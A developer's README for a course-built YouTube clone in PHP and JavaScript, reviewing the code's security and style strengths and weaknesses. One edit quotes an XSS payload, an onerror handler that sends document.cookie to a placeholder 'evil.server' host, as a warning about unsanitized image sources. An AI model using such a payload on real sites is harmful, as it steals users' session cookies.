# youtube-php-noframework-project
PHP/JS project with udemy course - Youtube clone, including API, ajax, frontend, backend, uploads and all sorts of functionalities </br>
course link - https://www.udemy.com/course/youtube-clone/ </br>

# Strengths: </br>
- Uses PDO and bind parameters </br>
- Uses sha512 hash </br>
- Uses sanitizing user input </br>
- Uses validation of user input </br>
- Uses error messages (that are stored in Constants class as public static) with validation functions (the idea of error array displaying all validation errors that became some kind
of standard instead of sloppy code that would display first error found and then if on resubmit this error goes away would show another one - such things used to happen
in the internet back in the day :) ) </br>
- Code is well structured, good OOP, descriptive names of classes and functions and keeping some kind of standard for the whole project </br>
- Uses regular expressions, built in php functions </br>
- Creates an API he accesses by javascript ajax (although I will never understand why backend php developers are so obsessed with using libraries like jQuery here or axios of example -
javascript fetch API can get the job done without introducing external dependencies and times when js used obscure XmlHTTPRequest are long gone...)</br>
- Some really good CSS... Im not CSS-frontend oriented but worth considering using sass and/or separating one huge style.css</br>
- Use of .text() instead of .html() in jQuery section (idk if its worth mentionting, but some people still let users edit innerHTML of the element, which is kind of like schoolar's
checkmate in terms of security) </br> 
- It is really good, really lengthy project, introducing idea of designing, creating YouTube clone, having API and a lot of client-server communication,
 kind of reactive while using just PHP and JS with no frontend framework, really well structured and preserving one style, one well-read convention through the whole project. </br>
 
# Weaknesses: </br>

- Does not provide types while binding parameters</br>
- Binds parameters before declaring a variable so it "shows in red" in code editor</br>
- I do not see any CORS mechanism in api </br>
- No validation in api whether routes are accessed by POST method or some other HTTP verb </br>
- No use of autoloading feature of any kind while having lengthy imports </br>
- No use of any templating engine </br>
- Using exec() and shell_exec() is always a red alert for me </br>
- I always use "filter_input(INPUT_SERVER, 'PHP_SELF', FILTER_SANITIZE_URL);" on PHP_SELF... just like exec(), it is some kind of red alert for me </br>
- Aside frome critique, I cannot expect one course to cover all sorts of topics, including frontend, security and so on... It is lengthy enough as a good learning project
and good enough for me to show it off that Ive completed it </br>
- EDIT: Been going through code again (since I completed the course some time ago and now im just registering my work) and just noticed 
use of sizeof() alias for count()... It is a bad habit bc it cofuses people who know laguages like C/C++ and expect information of memory allocated from such name...
To be honsest, I have no idea what the creators of PHP had in mind creating such a confusing alias. There are a lot of tricky things that exist both in C and PHP - 
some function names, for(;;) loop, printf("%d", printf("Hello world!")), passing parameters by reference like in C++ and so on... So why name something not
related to memory allocation at all sizeof - I dont know. But I believe one should just not use this alias at all. </br>
- EDIT: In this project we used hard-coded default profile picture, but if it was some real project I would probably make sure that in line here: </br>
\<img src='$coverPhotoSrc' class='coverPhoto'\></br>
$coverPhotoSrc variable will never turn into something like: ' onerror="this.src='http://evil.server/exploit.php?'+document.cookie" />. </br>
It is always better to double check everything, especially if it was some real life scenario and not Udemy course project, that much I know...</br>
- EDIT: Again - profile pic is hardcoded path here but it is worth remembering that uploaded pictures should be rather re-processed with
gd library rather than saved as they come... Another thing to watch out </br>



